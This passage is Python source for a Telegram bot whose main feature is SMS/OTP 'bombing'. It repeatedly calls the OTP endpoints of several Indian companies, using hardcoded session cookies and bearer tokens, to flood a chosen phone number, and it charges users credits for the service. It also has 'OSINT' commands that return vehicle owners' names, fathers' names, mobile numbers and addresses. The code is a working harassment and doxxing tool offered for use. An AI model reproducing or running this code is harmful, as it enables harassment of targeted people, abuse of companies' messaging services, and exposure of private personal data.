                'vidyakul_selected_stream': 'eyJpdiI6Ik0rb3pnN0gwc21pb1JsbktKNkdXOFE9PSIsInZhbHVlIjoibE9rWGhTXC8xQk1OektzXC9zNXlcLzloR0xjQ2hCMU5nT2pobU0rMU1FbjNSOD0iLCJtYWMiOiJiZjY4MWFhNWM2YzE4ZmViMDhlNWI2OGQ5YmNjM2I3NjNhOTJhZDc5ZDk3ZWE1MGM5OTA4MTA5ODhmMjRkZjk2In0%3D', 
                '_ga_53F4FQTTGN': 'GS2.2.s1759726084$o1$g1$t1759726091$j53$l0$h0', 
                'mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3A7b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22%24device_id%22%3A%227b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22mp_lib%22%3A%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%22bing%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D', 
                'XSRF-TOKEN': 'eyJpdiI6IjFTYW9wNmVJQjY3TFpEU2RYeEdNbkE9PSIsInZhbHVlIjoidmErTnBFcU1JVHpFN2daOENRVG9aQ1RNU25tZnQ1dkM2M1hkQitSdVZRNGxtZUVpTFNvbjM2NlwvVEpLTkFqcCtiTHhNbjVDZWhSK3h1VytGQ0NiRFRRPT0iLCJtYWMiOiI1ZjM3ZDk1YzMwZTYzOTMzM2YwYzFhYTgyNjYzZDRmYWE4ZWQwMDdhYzM1MTdlM2NkNjgzZTNjNWNjZmI2ZWQ4In0%3D', 
                'vidyakul_session': 'eyJpdiI6IlNDQWNpU2ZXMTEraENaaGtsQkJPMmc9PSIsInZhbHVlIjoicXFRbWVqNXhiejlwTFFpXC9OVmdWQkZsODhjUVpvenE0eTB3cGFiQ2F4ckx5Y3dcL3Z1S1NmNnhRNEduV01WT3Q1d2pKMlF3blpySU5YUU5vUldFTFI1dz09IiwibWFjIjoiOWFjNTM1NmQyMTg2YWE0MGZiMzljOGM0MDMzZjc4NWQyNzM0NTU4MzhkZjczNjU3OGNhNGM0Yjg2ZTEwZTJhMSJ9'
            }
            headers = {
              'accept': 'application/json, text/javascript, */*; q=0.01', 
              'accept-language': 'en-US,en;q=0.9', 
              'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
              'origin': 'https://vidyakul.com', 
              'referer': 'https://vidyakul.com/explore-courses/class-10th/english-medium-biharboard', 
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0', 
              'x-csrf-token': 'fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q', 
              'x-requested-with': 'XMLHttpRequest'
            }
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()
        
        # 27: NEW API - Aditya Birla Capital
        elif lim == 27: 

            cookies = {
                '_gcl_au': '1.1.781134033.1759810407', 
                '_gid': 'GA1.2.1720693822.1759810408', 
                'sess_map': 'eqzbxwcubfayctusrydzbesabydweezdbateducxxdcrxstydtyzrbrtzsuqbdaswwuffravtvutuzuqcsvrtescduettszavexcraaevefqbwccdwvqucftswtzqxtbafdfycqwuqvryswywubrayfrbbfcszcywqsdyauttdaaybsq', 
                '_ga': 'GA1.3.1436666301.1759810408', 
                'WZRK_G': 'd74161bab0c042e8a9f0036c8570fe44', 
                'mfKey': '14m4ctv.1759810410656', 
                '_ga_DBHTXT8G52': 'GS2.1.s1759810408$o1$g1$t1759810411$j57$l0$h328048196', 
                '_uetsid': 'fc23aaa0a33311f08dc6ad31d162998d', 
                '_uetvid': 'fc23ea50a33311f081d045d889f28285', 
                '_ga_KWL2JXMSG9': 'GS2.1.s1759810411$o1$g1$t1759810814$j54$l0$h0', 
                'WZRK_S_884-575-6R7Z': '%7B%22p%22%3A3%2C%22s%22%3A1759810391%2C%22t%22%3A1759810815%7D'
            }
            headers = {
                'Accept': '/*', 
                'Accept-Language': 'en-US,en;q=0.9', 
                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJ1bmlxdWVfYXNzaWduZWRfbnVtYmVyIjoiYjViMWVmNGQtZGI0MS00NzExLThjMjAtMGU4NjQyZDBlMDJiIiwiY3JlYXRlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjQzOjExIEFNIiwiZXhwaXJlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjU4OjExIEFNIiwiaWF0IjoxNzU5ODEwMzkxLCJpc3MiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJhdWQiOiJodHRwczovL2hvc3QtdXJsIiwiZXhwIjoxNzU5ODExMjkxfQ.N8a-NMFqmgO0vtY9Bp14EF22Jo3bMEB4n_OlcgwF3RZdIJDg5ZwC_WFc1aI-AU7BdWjpfrEc52ZSsfQ73S8pnY8RePnJrKqmE61vdWRY37VAULvD99eMl2AS7W2lEdE5EZoGGM2WqBuTzW8aO5QIt98deWDSyK9xG0v4tfbYG0469g7mOOpeCAuZC3gTIKZ93k7aHyMcf5FPjSsfIdNxqmdW0IrRx6bOdyr_w3AmYheg4aNNfMi5bc6fu_eKXABuwC9O420CFai9TIkImUEqr8Rxy4Sfe7aFVTN6DB8Fv_J1i7GBgCa3YX0VfZiGpVowXmcTqJQcGSiH4uZVRsmf3g', 
                'Connection': 'keep-alive', 
                'Content-Type': 'application/json', 
                'Origin': 'https://oneservice.adityabirlacapital.com', 
                'Referer': 'https://oneservice.adityabirlacapital.com/login', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'authToken': 'eyJraWQiOiJLY2NMeklBY3RhY0R5TWxHVmFVTm52XC9xR3FlQjd2cnNwSWF3a0Z0M21ZND0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzcGRsN2xobHI4ZDkxNm1qcDNyaWt1dGNlIiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhdXRoXC9zdmNhcHAiLCJhdXRoX3RpbWUiOjE3NTk4MDcyNDEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5hcC1zb3V0aC0xLmFtYXpvbmF3cy5jb21cL2FwLXNvdXRoLTFfd2h3N0dGb0oxIiwiZXhwIjoxNzU5ODE0NDQxLCJpYXQiOjE3NTk4MDcyNDEsInZlcnNpb24iOjIsImp0aSI6IjVjNTM1ODkxLTBiZjItNDk3ZS04ZTZiLWNkZWZiNzA0OGY1YyIsImNsaWVudF9pZCI6InNwZGw3bGhscjhkOTE2bWpwM3Jpa3V0Y2UifQ.noVIL6Tks0NHZwCmokdjx4hpXntkuNQQjPglIwk-4qG6_DzqmJkYxRkH_ekYxbP0kiWpQp4iDLZasiiP5EIlAXgGZHEY5dEf0jAaiIl8EEGtj4VkUV46njil4LOBFCxsdNfJ-i4hO6iCBddwXu_6OMWJArERdPlg6cpej_y91aPe-UjSuaHexSTmtdzoTRGnZw5W57uiVRZwY3iCPjLWEY-8Qj9a0HqSwTg7oNvOOMac5hCif4IoCNCMP8VoR4F-EttDdWpqW3hETGE6VBMU8R3rY2Q-Vm4CB2VdbToSGtjxFwuMq66OMpVM_G7Fq478JgPhmv9sb85bo2jto8gvow', 
                'browser': 'Microsoft Edge', 
                'browserVersion': '141.0', 
                'csUserId': 'CS6GGNB62PFDLHX6', 
                'loginSource': '26', 
                'pageName': '/login', 
                'source': '151', 
                'traceId': 'CSNwb9nPLzWrVfpl'
            }
            
            data = {'request':'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, cookies=cookies, json=data, timeout=5)
            return response.status_code == 200

        # 28: NEW API - Pinknblu
        elif lim == 28:
            cookies = {
                '_ga': 'GA1.1.1922530896.1759808413', 
                '_gcl_au': '1.1.178541594.1759808413', 
                '_fbp': 'fb.1.1759808414134.913709261257829615', 
                'laravel_session': 'eyJpdiI6IllNM0Z5dkxySUswTlBPVjFTN09KMkE9PSIsInZhbHVlIjoiT1pXQWxLUVdYNXJ0REJmU3Q5R0EzNWc5cGJHbzVsaG5oWjRweFRTNG9cL2l4MHdXUVdTWEFtbEsybDdvTjAyazN4dERkdEsrMlBQeTdYUTR4RXNhNWM5WDlrZGtqOEk2eEVcL1BUUEhoN0F4YjJGTWZKd0tcL2JaQitXZmxWWjRcL0hXIiwibWFjIjoiMTNlZDhlNzM2MmIyMzRlODBlNWU0NTJkYjdlOTY5MmJhMzAzM2UyZjEwODAwOTk5Mzk1Yzc3ZTUyZjBhM2I4ZSJ9', 
                '_ga_8B7LH5VE3Z': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h1570660322', 
                '_ga_S6S2RJNH92': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h0'
            }
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01', 
                'Accept-Language': 'en-US,en;q=0.9', 
                'Connection': 'keep-alive', 
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Origin': 'https://pinknblu.com', 
                'Referer': 'https://pinknblu.com/', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'X-Requested-With': 'XMLHttpRequest', 
                'sec-ch-ua': '"Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 
                'sec-ch-ua-mobile': '?0', 
                'sec-ch-ua-platform': '"Windows"'
            }
            data = {
                '_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 
                'country_code': f'+{cc}', 
                'phone': pn
            }
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', headers=headers, cookies=cookies, data=data, timeout=5)
     
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 29: NEW API - Udaan
        elif lim == 29:
            cookies = {
                'gid': 'GA1.2.153419917.1759810454', 
                'sid': 'AVr5misBh4gBAIMSGSayAIeIHvwJYsleAXWkgb87eYu92RyIEsDTp7Wan8qrnUN7IeMj5JEr1bpwY95aCuF1rYO/', 
                'WZRK_S_8R9-67W-W75Z': '%7B%22p%22%3A1%7D', 
                'mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3Ac4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24device_id%22%3A%22c4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D', 
                '_ga_VDVX6P049R': 'GS2.1.s1759810459$o1$g0$t1759810459$j60$l0$h0', 
                '_ga': 'GA1.1.803417298.1759810454'
            }
            headers = {
                'accept': '/*', 
                'accept-language': 'en-IN', 
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 
                'origin': 'https://auth.udaan.com', 
                'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2', 
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'x-app-id': 'udaan-auth'
            }
            data = {'mobile': pn}
            url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true'
            response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()
            
        # 30: NEW API - Nuvama Wealth
        elif lim == 30:
            headers = {
              'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e', 
              'Referer': 'https://onboarding.nuvamawealth.com/', 
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0', 
              'Content-Type': 'application/json'
            }
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        return False

    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False

def bombing_worker(user_id, phone, cc):
    api_indices = list(range(31))
    while bombing_active.get(user_id) and request_counts.get(user_id, 0) < 900000000000:
        if not api_indices: break
        idx = random.choice(api_indices)
        success = getapi(phone, idx, cc)
        request_counts[user_id] = request_counts.get(user_id, 0) + 1
        if not success and idx in api_indices: api_indices.remove(idx)
        time.sleep(0.4)

async def perform_bombing(user_id, phone, msg, msg_id, duration, cost):
    if not deduct_credit(user_id, cost):
        await msg.edit("❌ **Insufficient Credits!**\nSend `/GetCredits` to earn free credits.", parse_mode='markdown')
        return
    bombing_active[user_id] = True
    request_counts[user_id] = 0
    start = time.time()
    thread = threading.Thread(target=bombing_worker, args=(user_id, phone, "91"))
    thread.daemon = True
    thread.start()
    bombing_threads[user_id] = thread
    buttons = [[Button.inline("🔴 Cancel Bombing", f"cancel_bomb_{user_id}")], [Button.inline("🎁 Earn Free Credits", "earn_credits")]]
    while bombing_active.get(user_id) and (time.time() - start) < duration:
        elapsed = int(time.time() - start)
        remaining = duration - elapsed
        sent = request_counts.get(user_id, 0)
        credits_left = user_credits.get(user_id, 5)
        status = f"📱 Number: `{phone}`\n👤 By: {msg.chat.first_name}\n💎 Credits Left: {credits_left}\n📊 Sent: {sent}\n⏳ Time Left: {remaining}s"
        try: await msg.edit(status, buttons=buttons, parse_mode='markdown')
        except: pass
        await asyncio.sleep(1)
    bombing_active[user_id] = False
    if thread.is_alive(): thread.join(timeout=1)
    final = request_counts.get(user_id, 0)
    buttons = [[Button.inline("🔄 Choose Again", f"choose_again_{user_id}")], [Button.inline("🎁 Earn Free Credits", "earn_credits")]]
    await msg.edit(f"✅ **Bombing Complete!**\n📱 Number: `{phone}`\n📊 Total Sent: {final}\n⏱️ Duration: {duration}s\n💎 Credits Used: {cost}\n💎 Remaining: {user_credits.get(user_id, 5)}", buttons=buttons, parse_mode='markdown')

# ================= OSINT COMMANDS =================
@client.on(events.NewMessage(pattern="/start"))
async def start(event):
    add_user(event.sender_id)
    photo = await get_photo_from_message()
    msg = await event.respond(file=photo, message="**Hi 👋🏻 , I'm OSINT Bot 📡**\n\n**Send /help For All Commands** ⚙️", buttons=[[Button.url("📞 Contact Me", CONTACT_LINK), Button.url("Channel 📢", CHANNEL_LINK)]], parse_mode='markdown') if photo else await event.respond(message="**Hi 👋🏻 , I'm OSINT Bot 📡**\n\n**Send /help For All Commands** ⚙️", buttons=[[Button.url("📞 Contact Me", CONTACT_LINK), Button.url("Channel 📢", CHANNEL_LINK)]], parse_mode='markdown')
    asyncio.create_task(auto_delete(msg))

@client.on(events.NewMessage(pattern="/help"))
async def help_cmd(event):
    add_user(event.sender_id)
    msg = await event.reply("**Commands:**\n📱 `/num <number>` - Number info\n🎮 `/ff <uid>` - FF info\n🚗 `/vnum <number>` - Vehicle info\n🔒 `/addnum <number>` - Protect number\n🔒 `/addff <uid>` - Protect FF UID\n🔓 `/removenum <number>` - Remove protection\n🔓 `/removeff <uid>` - Remove FF protection\n📋 `/protectedlist` - Your protected items", parse_mode='markdown')
    asyncio.create_task(auto_delete(msg))

@client.on(events.NewMessage(pattern=r"(?i)/addnum (\d+)"))
async def add_number(event):
    user_id = event.sender_id
    number = event.pattern_match.group(1)
    number = re.sub(r'\D', '', number)
    if len(number) >= 10: number = number[-10:]
    else: return await event.reply("⚠️ Send valid 10-digit number.\nExample: `/addnum 9876543210`", parse_mode='markdown')
    if user_id == ADMIN_ID:
        if number not in admin_data.get("numbers", []):
            admin_data["numbers"].append(number)
            await update_admin_data_msg()
            await event.reply(f"✅ Number `{number}` protected successfully ✅", parse_mode='markdown')
        else: await event.reply(f"⚠️ Number `{number}` already protected.", parse_mode='markdown')
    else:
        user_identifier = f"@{event.sender.username}" if event.sender.username else f"user_{user_id}"
        if number in admin_data.get("numbers", []): return await event.reply(f"⚠️ Number `{number}` protected by admin.", parse_mode='markdown')
        for data in users_data.values():
            if number in data.get("numbers", []): return await event.reply(f"⚠️ Number `{number}` protected by another user.", parse_mode='markdown')
        if user_identifier not in users_data: users_data[user_identifier] = {"numbers": [], "ff_uids": []}
        if number not in users_data[user_identifier]["numbers"]:
            users_data[user_identifier]["numbers"].append(number)
            await update_users_data_msg()
            await event.reply(f"✅ Your Number `{number}` Protected Successfully 🔐✅\nStored in memory, not in any database 🔒✅", parse_mode='markdown')
        else: await event.reply(f"⚠️ Number `{number}` already in your protected list.", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/removenum (\d+)"))
async def remove_number(event):
    user_id = event.sender_id
    number = event.pattern_match.group(1)
    if user_id == ADMIN_ID:
        if number in admin_data.get("numbers", []):
            admin_data["numbers"].remove(number)
            await update_admin_data_msg()
            await event.reply(f"✅ Number `{number}` Removed From Protected List 🔓", parse_mode='markdown')
        else: await event.reply(f"❌ Number `{number}` not in protected list.", parse_mode='markdown')
    else:
        user_identifier = f"@{event.sender.username}" if event.sender.username else f"user_{user_id}"
        if user_identifier in users_data and number in users_data[user_identifier]["numbers"]:
            users_data[user_identifier]["numbers"].remove(number)
            await update_users_data_msg()
            await event.reply(f"✅ Number `{number}` Removed From Protected List 🔓", parse_mode='markdown')
        else: await event.reply(f"❌ Number `{number}` not in your protected list.", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/addff (\d+)"))
async def add_ff(event):
    user_id = event.sender_id
    uid = event.pattern_match.group(1)
    if user_id == ADMIN_ID:
        if uid not in admin_data.get("ff_uids", []):
            admin_data["ff_uids"].append(uid)
            await update_admin_data_msg()
            await event.reply(f"✅ UID `{uid}` Protected Successfully 🎮🔒", parse_mode='markdown')
        else: await event.reply(f"⚠️ UID `{uid}` already protected.", parse_mode='markdown')
    else:
        user_identifier = f"@{event.sender.username}" if event.sender.username else f"user_{user_id}"
        if uid in admin_data.get("ff_uids", []): return await event.reply(f"⚠️ UID `{uid}` protected by admin.", parse_mode='markdown')
        for data in users_data.values():
            if uid in data.get("ff_uids", []): return await event.reply(f"⚠️ UID `{uid}` protected by another user.", parse_mode='markdown')
        if user_identifier not in users_data: users_data[user_identifier] = {"numbers": [], "ff_uids": []}
        if uid not in users_data[user_identifier]["ff_uids"]:
            users_data[user_identifier]["ff_uids"].append(uid)
            await update_users_data_msg()
            await event.reply(f"✅ Your UID `{uid}` Protected Successfully 🎮🔒✅\nStored in memory, not in any database 🔒✅", parse_mode='markdown')
        else: await event.reply(f"⚠️ UID `{uid}` already in your protected list.", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/removeff (\d+)"))
async def remove_ff(event):
    user_id = event.sender_id
    uid = event.pattern_match.group(1)
    if user_id == ADMIN_ID:
        if uid in admin_data.get("ff_uids", []):
            admin_data["ff_uids"].remove(uid)
            await update_admin_data_msg()
            await event.reply(f"✅ UID `{uid}` Removed From Protected List 🔓", parse_mode='markdown')
        else: await event.reply(f"❌ UID `{uid}` not in protected list.", parse_mode='markdown')
    else:
        user_identifier = f"@{event.sender.username}" if event.sender.username else f"user_{user_id}"
        if user_identifier in users_data and uid in users_data[user_identifier]["ff_uids"]:
            users_data[user_identifier]["ff_uids"].remove(uid)
            await update_users_data_msg()
            await event.reply(f"✅ UID `{uid}` Removed From Protected List 🔓", parse_mode='markdown')
        else: await event.reply(f"❌ UID `{uid}` not in your protected list.", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/protectedlist"))
async def protected_list(event):
    user_id = event.sender_id
    if user_id == ADMIN_ID:
        try:
            admin_msg = await client.get_messages(STORAGE_CHANNEL, ids=ADMIN_DATA_MSG_ID)
            users_msg = await client.get_messages(STORAGE_CHANNEL, ids=USER_DATA_MSG_ID)
            text = "📋 **FULL PROTECTED LIST**\n\n"
            if admin_msg and admin_msg.text: text += admin_msg.text + "\n\n"
            if users_msg and users_msg.text: text += users_msg.text
            await event.reply(text, parse_mode='markdown')
        except: await event.reply(f"❌ Error", parse_mode='markdown')
    else:
        user_identifier = f"@{event.sender.username}" if event.sender.username else f"user_{user_id}"
        if user_identifier in users_data:
            data = users_data[user_identifier]
            text = "🔒 **Your Protected Items**\n\n"
            text += f"📞 Numbers: {data.get('numbers', []) if data.get('numbers') else 'None'}\n"
            text += f"🎮 FF UIDs: {data.get('ff_uids', []) if data.get('ff_uids') else 'None'}\n\n"
            text += "Remove: `/removenum <number>` or `/removeff <uid>`"
            await event.reply(text, parse_mode='markdown')
        else: await event.reply("🔒 No protected items.\nUse `/addnum <number>` or `/addff <uid>` to protect.", parse_mode='markdown')

@client.on(events.NewMessage(pattern='/broadcast'))
async def cmd_broadcast(event):
    global broadcast_waiting
    if not event.is_private or event.sender_id != ADMIN_ID: return
    if broadcast_waiting: return await event.reply("⚠️ Already waiting.", parse_mode='markdown')
    users = get_all_users()
    if not users: return await event.reply("❌ No users found.", parse_mode='markdown')
    broadcast_waiting = True
    await event.reply("📤 **Broadcast Mode Activated**\nSend content to broadcast.", parse_mode='markdown', buttons=[[Button.inline("🚫 Cancel", "cancel_broadcast")]])

@client.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id == ADMIN_ID))
async def admin_message_handler(event):
    global broadcast_waiting, broadcast_active
    if event.text and (event.text.startswith('/') or not broadcast_waiting): return
    if broadcast_waiting:
        broadcast_waiting = False
        broadcast_active = True
        users = get_all_users()
        status_msg = await event.reply("🔄 Starting broadcast...")
        total = len(users)
        success = fail = blocked = deleted = 0
        for uid in users:
            if not broadcast_active: break
            try:
                if event.media: await client.send_file(uid, event.media, caption=event.text)
                elif event.text: await client.send_message(uid, event.text)
                else: await client.send_message(uid, "📢 New broadcast!")
                success += 1
            except Exception as e:
                fail += 1
                if "blocked" in str(e).lower(): blocked += 1
                elif "deactivated" in str(e).lower(): deleted += 1
            await asyncio.sleep(0.2)
        broadcast_active = False
        await status_msg.edit(f"📊 **Broadcast Completed**\n✅ Success: {success}\n❌ Failed: {fail}\n🚫 Blocked: {blocked}\n🗑️ Deleted: {deleted}", parse_mode='markdown')

@client.on(events.NewMessage(pattern='/stats'))
async def bot_stats(event):
    if event.sender_id != ADMIN_ID: return
    total_users = get_user_count()
    total_user_numbers = sum(len(d.get("numbers", [])) for d in users_data.values())
    total_user_ff = sum(len(d.get("ff_uids", [])) for d in users_data.values())
    await event.reply(f"🤖 **Bot Statistics**\n👥 Users: {total_users}\n👑 Admin Numbers: {len(admin_data.get('numbers', []))}\n👑 Admin FF: {len(admin_data.get('ff_uids', []))}\n👤 User Numbers: {total_user_numbers}\n👤 User FF: {total_user_ff}", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/credits$"))
async def credits_cmd(event):
    user_id = event.sender_id
    sub = user_subscription.get(user_id)
    if sub and sub.get('expiry', 0) > time.time():
        days = int((sub['expiry'] - time.time()) / 86400)
        await event.reply(f"💎 **Balance**\nUnlimited Active\n{days} days remaining", parse_mode='markdown')
    else:
        await event.reply(f"💎 **Balance**\nCredits: {user_credits.get(user_id, 5)}💎\nSend `/GetCredits` to earn more!", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/GetCredits$"))
async def get_credits_cmd(event):
    buttons = [
        [Button.url("🎁 Claim 5💎", CLAIM_5_LINK), Button.url("🎁 Claim 3💎", CLAIM_3_LINK)],
        [Button.inline("✅ Verify & Claim", "verify_credits")]
    ]
    await event.reply("🎁 **Earn Free Credits**\nJoin both channels, click Verify, get 8💎 total!", buttons=buttons, parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/bomb$"))
async def bomb_cmd(event):
    user_id = event.sender_id
    add_user(user_id)
    if not has_access(user_id):
        return await event.reply("❌ **Insufficient Credits!**\nSend `/GetCredits` to earn free credits.", parse_mode='markdown')
    if bombing_active.get(user_id):
        return await event.reply("⚠️ **Bombing already in progress!**", parse_mode='markdown')
    can, rem = await check_rate_limit(user_id, "bomb")
    if not can:
        return await event.reply(f"⏰ Please wait **{rem}** seconds!", parse_mode='markdown')
    user_state[user_id] = {"type": "bomb"}
    await event.reply("📱 **Send target phone number**\nExample: `+91 9876543210` or `9876543210`", parse_mode='markdown')

@client.on(events.NewMessage(pattern=r"(?i)/vnum"))
async def vnum_cmd(event):
    user_id = event.sender_id
    add_user(user_id)
    args = event.raw_text.split()
    if len(args) > 1:
        await process_vehicle(event, args[1])
        return
    user_state[user_id] = {"type": "vnum"}
    await event.reply("🚗 **Send Vehicle Number**\nExample: `PB02CN4196`", parse_mode='markdown')

async def process_vehicle(event, text):
    user_id = event.sender_id
    can, rem = await check_rate_limit(user_id, "vnum")
    if not can: return await event.reply(f"⏰ Wait **{rem}** seconds!", parse_mode='markdown')
    await update_rate_limit(user_id, "vnum")
    vnum = text.strip().upper()
    wait = await event.reply("🚗 **Fetching Vehicle Info...**", parse_mode='markdown')
    try:
        res = requests.get(VEHICLE_API.format(vnum), timeout=10).json()
        if res.get('status') == 'success' and res.get('vehicle_details', {}).get('vehicle_details'):
            d = res['vehicle_details']['vehicle_details']
            owner = d.get('owner', {})
            result = f"🚗 **Vehicle Info**\n\n📋 Number: `{vnum}`\n👤 Owner: {owner.get('name', 'N/A')}\n👨 Father: {owner.get('fatherName', 'N/A')}\n📞 Mobile: {owner.get('mobileNumber', 'N/A')}\n📍 Address: {d.get('addresses', {}).get('permanent', {}).get('address', 'N/A')}\n🏭 Model: {d.get('vehicleDetails', {}).get('model', 'N/A')}\n🎨 Color: {d.get('vehicleDetails', {}).get('color', 'N/A')}\n📅 Reg Date: {d.get('vehicle', {}).get('registrationDate', 'N/A')}\n✅ Valid Till: {d.get('vehicle', {}).get('validTill', 'N/A')}"
        else: result = "⚠️ **NO RESULT FOUND**"
    except: result = "⚠️ **API Error**"
    await wait.delete()
    msg = await event.reply(result, parse_mode='markdown')
    warn = await event.respond("⚠️ This will self-destruct in 15 seconds")
    asyncio.create_task(delete_15sec(msg))
    asyncio.create_task(delete_15sec(warn))

@client.on(events.NewMessage(pattern=r"(?i)/num"))
async def num_cmd(event):
    user_id = event.sender_id
    add_user(user_id)
    can, rem = await check_rate_limit(user_id, "num")
    if not can:
        countdown = await event.reply(f"⏰ Wait **{rem}** seconds!", parse_mode='markdown')
        for i in range(rem, 0, -1):
            await asyncio.sleep(1)
            try:
                if i-1 > 0: await countdown.edit(f"⏰ Wait **{i-1}** seconds!", parse_mode='markdown')
                else: await countdown.delete()
            except: break
        return
    args = event.raw_text.split()
    if len(args) > 1:
        await process_number(event, args[1])
        return
    user_state[user_id] = {"type": "num", "attempts": 0}
    msg = await event.reply("📱 **Send Phone Number**\nExample: `9876543210`", parse_mode='markdown')
    asyncio.create_task(auto_delete(msg, 60))
    await asyncio.sleep(60)
    if user_id in user_state and user_state[user_id].get("type") == "num":
        del user_state[user_id]
        await event.reply("⏰ Timeout! Send `/num` again.", parse_mode='markdown')

async def process_number(event, text):
    user_id = event.sender_id
    can, rem = await check_rate_limit(user_id, "num")
    if not can:
        cd = await event.reply(f"⏰ Wait **{rem}** seconds!", parse_mode='markdown')
        for i in range(rem, 0, -1):
            await asyncio.sleep(1)
            try:
                if i-1 > 0: await cd.edit(f"⏰ Wait **{i-1}** seconds!", parse_mode='markdown')
                else: await cd.delete()
            except: break
        return
    num = extract_number(text)
    if not num:
        att = user_state.get(user_id, {}).get("attempts", 0) + 1
        user_state[user_id] = {"type": "num", "attempts": att}
        if att >= 3:
            await delete_waiting_message(user_id)
            msg = await event.reply("❌ **Invalid number!**\nSend `/num 9876543210`", parse_mode='markdown')
            asyncio.create_task(auto_delete(msg, 15))
            del user_state[user_id]
        else:
            msg = await event.reply(f"⚠️ **Invalid!** ({att}/3)\nSend 10-digit number.", parse_mode='markdown')
            user_waiting_messages[user_id] = msg
            asyncio.create_task(auto_delete(msg, 15))
        return
    if user_id in user_state: del user_state[user_id]
    await update_rate_limit(user_id, "num")
    if is_number_protected(num):
        wait = await event.reply("📡 **Fetching Info...**", parse_mode='markdown')
        await asyncio.sleep(1)
        await wait.delete()
